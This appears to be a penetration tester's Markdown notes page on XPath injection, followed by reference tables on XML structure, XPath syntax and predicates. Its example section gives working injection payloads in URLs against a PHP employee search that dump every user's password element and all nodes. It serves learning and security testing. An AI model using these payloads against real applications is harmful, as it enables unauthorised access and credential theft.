# XPath Injection

## Overview

XPath is similar to SQLi in that we are injecting payloads into queries, however, instead of injecting into SQL queries we are injecting into XPath (XML Path Language). XPath is used to retrieve data from an XML document and is often used with languages such as PHP.

## Example Attack

> Payload list used: [Intruder/XML](https://github.com/R031NF1NCH/0/blob/main/Intruder/XML)

The `work` parameter in the following URL is vulnerable to XPath injection. This was identified by a number of simplexml errors returned when injecting special chars.

```
http://192.168.0.1/employee.php?work=van&action=search
```

As the XPath query was being used in PHP we ran the [payload list](https://github.com/R031NF1NCH/0/blob/main/Intruder/XML) to break out of the XPath statement. While running the payload list we guessed that there might be a password element and so we appended `//password%00` to the injection point before running the intruder.

The attack was successful using the following payload `')%5D//password%00` returning the contents of the password element for all users:

```
http://192.168.0.1/employee.php?work=')%5D//password%00&action=search
```

Return data in all elements by injecting `')%5D//*%00`:

```
http://192.168.0.1/employee.php?work=')%5D//*%00&action=search
```

Return all nodes:

```
http://192.168.0.1/employee.php?work=%27)%5D//node()%00&action=search
```

---

## XML Document Structure

> Reference: [vaadata.com - XPath Injections](https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/#understanding-the-structure-of-xml-documents)

The first line of the XML document contains the XML declaration, which specifies the version used (in this case 1.0) and the type of character encoding (in this case UTF-8).

The rest of the document is made up of different nodes. The most common types are:

- **Root node** — represents the entire document and can have only one child
- **Elements** — can contain text, attributes or other elements. Each element has a single parent and can have one or more children
- **Attributes** — provide additional information about an element
- **Text** — the content of elements
- **Comments** — used to document the file

```xml
<?xml version="1.0" encoding="UTF-8"?>

<products>
<!-- List of products -->
  <product>
    <id>1</id>
    <name>Lamp</name>
    <price currency="EUR">20</price>
  </product>
  <product>
    <id>2</id>
    <name>Fan</name>
    <price currency="USD">50</price>
  </product>
  <product>
    <id>3</id>
    <name>Pillow</name>
    <price currency="GBP">15</price>
  </product>
</products>
```

### Node Types in the Example Above

| Name | Node Type |
|------|-----------|
| products | Root node |
| product, id, name, price | Element |
| 1, Lamp, Fan, Pillow | Text |
| currency | Attribute |
| List of products | Comment |

---

## XPath Syntax Reference

| Syntax | Description |
|--------|-------------|
| `/` | Select the root node |
| `//` | Selects the child nodes |
| `.` | Selects the context node |
| `..` | Select the parent node |
| `@attribute` | Selects the 'attribute' attribute |
| `text()` | Selects the text nodes |
| `node()` | Select all the nodes |
| `*` | Selects all elements |
| `@*` | Selects all attributes |
| `\|` | Combine XPath requests |

> **Note:** Several XPath requests can produce the same result. The following examples illustrate some of the possibilities, but there are many others.

### Query Examples

| Objective | Query |
|-----------|-------|
| Select all 'product' elements | `/products/product` or `//product` |
| Select all 'name' elements | `/products/product/name` or `//name` or `/*/*/name` |
| Select all attributes | `//@*` |
| Select all 'currency' attributes | `//@currency` |
| Select all nodes in root element | `/node()` |
| Select all nodes | `//node()` |
| Select all text nodes | `//text()` |
| Select all element nodes | `//*` |
| Select all 'id' and 'price' elements | `//id \| //price` |

---

## XPath Predicates

Like the `WHERE` in an SQL query, predicates can be used to filter the results of an XPath query. A predicate is written in square brackets `[ ]` and can include various operators and functions.

### Operators

| Operator | Description |
|----------|-------------|
| `+` | Addition |
| `-` | Subtraction |
| `*` | Multiplication |
| `div` | Division |
| `=` | Is equal to |
| `!=` | Is not equal to |
| `<` | Is less than |
| `<=` | Is less than or equal to |
| `>` | Is greater than |
| `>=` | Is greater than or equal to |
| `or` | Boolean OR |
| `and` | Boolean AND |
| `mod` | Modulo |
| `position()` | Represents the position of the node |
| `last()` | Represents the number of elements in the sequence being processed |
| `true()` | Boolean true |
| `contains()` | Character string search |

### Predicate Examples

| Objective | Query |
|-----------|-------|
| Select the first 'product' element | `//product[1]` or `//product[position()=1]` |
| Select the last 'product' element | `//product[last()]` |
| Select product where currency = 'GBP' | `//product/price[@currency='GBP']/..` or `//product/*[@currency='GBP']/..` |
| Select products with id between 1 and 3 | `/products/product[id>1 and id<3]` |
| Select second child of third parent | `/products/product[3]/name` or `/*/*[3]/*[2]` |
